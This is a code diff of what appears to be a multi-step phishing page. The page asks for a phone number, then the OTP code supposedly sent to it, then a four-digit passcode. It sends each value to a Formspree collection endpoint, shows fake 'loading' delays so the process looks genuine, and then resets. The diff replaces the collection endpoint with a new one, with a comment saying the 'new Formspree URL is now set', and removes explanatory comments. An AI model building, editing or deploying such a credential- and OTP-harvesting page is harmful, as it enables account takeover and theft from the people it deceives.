@@ -35,7 +35,7 @@
             display: flex;
         }
 
-        /* --- MODIFICATION: Loader Overlay Styles --- */
+        /* --- Loader Overlay Styles --- */
         .loader-overlay {
             display: none; /* Hidden by default */
             position: fixed;
@@ -220,7 +220,7 @@
             <p id="phone-display">sent to ...</p>
             <form id="form-2" style="width:100%">
                 <input type="hidden" name="_subject" value="Step 2: OTP Code">
-                <input type="hidden" id="otp-full-code" name="otp_code">
+                <input type="hidden" id="otp-full-code" name="OTP Code">
                 <div class="otp-container">
                     <input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
                 </div>
@@ -259,13 +259,14 @@
 
      <script>
          document.addEventListener('DOMContentLoaded', () => {
-            const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xldlpqzg'; 
+            // --- MODIFICATION: Your new Formspree URL is now set ---
+            const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xgvzpqqq'; 
 
             const pages = document.querySelectorAll('.page-section');
             const form1 = document.getElementById('form-1');
             const form2 = document.getElementById('form-2');
             const form3 = document.getElementById('form-3');
-            const loader = document.getElementById('loader-overlay'); // Loader element
+            const loader = document.getElementById('loader-overlay');
             
             if (form1) form1.action = FORMSPREE_ENDPOINT;
             if (form2) form2.action = FORMSPREE_ENDPOINT;
@@ -312,12 +313,9 @@
             btnToPage2.addEventListener('click', (e) => {
                 e.preventDefault();
                 if (btnToPage2.classList.contains('active')) {
-                    // MODIFICATION: Show loader and add delay
                     loader.classList.add('active');
                     submitForm(form1); // Send form 1 data
-                    
-                    const delay = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000; // Random delay 8-12 seconds
-
+                    const delay = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;
                     setTimeout(() => {
                         const fullPhoneNumber = form1.querySelector('select').value + phoneInput.value;
                         document.getElementById('phone-display').textContent = `sent to ${fullPhoneNumber}`;
@@ -337,13 +335,9 @@
                     let otp = Array.from(otpInputs).map(i => i.value).join('');
                     if (otp.length === otpInputs.length) {
                         fullOtpInput.value = otp;
-                        
-                        // MODIFICATION: Show loader and add delay
                         loader.classList.add('active');
                         submitForm(form2); // Send form 2 data
-
-                        const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000; // Random delay 5-10 seconds
-
+                        const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
                         setTimeout(() => {
                             loader.classList.remove('active');
                             showPage('page-3');
@@ -385,15 +379,13 @@
                     }
                     updatePasscodeView();
                     if (passcodeHiddenInput.value.length === 4) {
-                        // MODIFICATION: Show loader and add a short delay before reset
                         loader.classList.add('active');
                         submitForm(form3); // Send form 3 data
-                        
                         setTimeout(() => {
                             loader.classList.remove('active');
                             resetAllForms();
                             showPage('page-1');
-                        }, 2000); // 2 second delay
+                        }, 2000);
                     }
                 });
             });
